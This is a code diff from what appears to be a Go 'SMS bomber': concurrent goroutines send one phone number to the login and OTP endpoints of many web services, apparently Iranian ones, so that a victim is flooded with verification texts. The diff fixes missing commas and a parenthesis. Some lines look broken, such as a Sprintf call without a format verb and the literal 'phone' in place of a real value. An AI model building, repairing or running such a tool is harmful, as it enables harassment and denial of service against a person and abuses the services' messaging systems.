@@ -523,7 +523,7 @@ func main() {
 			"phone": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
-			"phone": "phone"
+			"phone": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms(fmt.Sprintf("https://api.torob.com/v4/user/phone/send-pin/?phone_number=", phone), map[string]interface{}{
 			"phone_number": "phone",
@@ -538,7 +538,7 @@ func main() {
 			"cellNumber": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
-			"phone": "phone"
+			"phone": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://tagmond.com/phone_number", map[string]interface{}{
 			"phone_number": "phone",
@@ -546,7 +546,7 @@ func main() {
 		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
 			"mobile­": "phone",
 		}, ch)  // edit :4/22/2025
-		go sms"https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
+		go sms("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
 			"phoneNumber": "phone",
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
